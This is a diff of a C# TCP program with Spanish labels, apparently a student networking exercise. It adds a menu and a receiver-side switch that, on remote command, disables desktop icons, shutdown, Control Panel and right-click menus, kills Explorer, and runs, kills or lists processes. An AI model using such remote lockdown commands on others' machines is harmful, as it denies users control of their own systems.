@@ -64,9 +64,19 @@ namespace NetworkStream__Servidor_
 		
 		public static void ProporcionarIP()
 		{
-			Console.WriteLine(" Introduce la direccion ip");
+			Console.WriteLine("Introduce la direccion ip");
 			string direccionIp = Console.ReadLine();
 			Console.WriteLine("Escriba la opcion: ___");
+					Console.WriteLine("Elija Una De Las Opciones");
+					Console.WriteLine("1: Quitar Iconos Del Escritorio");
+					Console.WriteLine("2: Quitar Opcion De Apagado");
+					Console.WriteLine("3: Desactivar Panel De Control");
+					Console.WriteLine("4: Desactivar Click Derecho De La Barra De Tareas");
+					Console.WriteLine("5: Desactivar Click Derecho Del Escritorio");
+					Console.WriteLine("6: Ejecutar programa");
+					Console.WriteLine("7: Terminar programa");
+					Console.WriteLine("8: Lista de procesos");
+					Console.WriteLine("9: Salir :) ");
 			string mensaje = Console.ReadLine();
 			IPEndPoint oIPEndPoint =new IPEndPoint(IPAddress.Parse(direccionIp),puerto);
 			Socket oSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream,ProtocolType.Tcp);
@@ -87,8 +97,68 @@ namespace NetworkStream__Servidor_
 			byte[] datos = new byte[1024];
 			int longitud = Cliente.Receive(datos);
 			string cadena = Encoding.ASCII.GetString(datos,0,longitud);
+			
 			try{
-				Console.WriteLine("\n" + cadena);
+				Console.WriteLine("\n Eligio la opcion: " + cadena);
+				Console.ReadKey();
+				int orden = int.Parse(cadena);
+				switch(orden)
+			{
+				case 1:
+					Console.WriteLine("Selecciono la opcion 1 ");
+					RegistroWindows();
+					EliminarExplorador();
+					break;
+					
+				case 2: 
+					Console.WriteLine("Selecciono la opcion 2 ");
+					EliminarApagado();
+					EliminarExplorador();
+					break;
+					
+				case 3:
+					Console.WriteLine("Selecciono la opcion 3 ");
+					EliminarPanelDeControl();
+					EliminarExplorador();
+					break;
+					
+				case 4:
+					Console.WriteLine("Selecciono la opcion 4 ");
+					EliminarClicDerechoBarraTareas();
+					EliminarExplorador();
+					break;
+					
+				case 5:
+					Console.WriteLine("Selecciono la opcion 5 ");
+					EliminarClickDerechoEscritorio();
+					EliminarExplorador();
+					break;
+					
+				case 6:
+					Console.WriteLine("Selecciono la opcion 6 ");
+					CrearProceso();
+					break;
+					
+				case 7:
+					Console.WriteLine(" Selecciono la opcion 7 ");
+					EliminarProcesoByNombre();
+					break;
+					
+				case 8:
+					Console.WriteLine(" Selecciono la opcion 8 ");
+					ProcesosLista();
+					break;
+					
+				case 9:
+					Console.WriteLine("Saliendo del programa");
+					Environment.Exit(0);
+					break;
+					
+				default:
+					Console.WriteLine(" Opcion invalida ");
+					break;
+			}
+				
 			}catch{
 				Console.WriteLine("Error ese programa no existe");
 			}
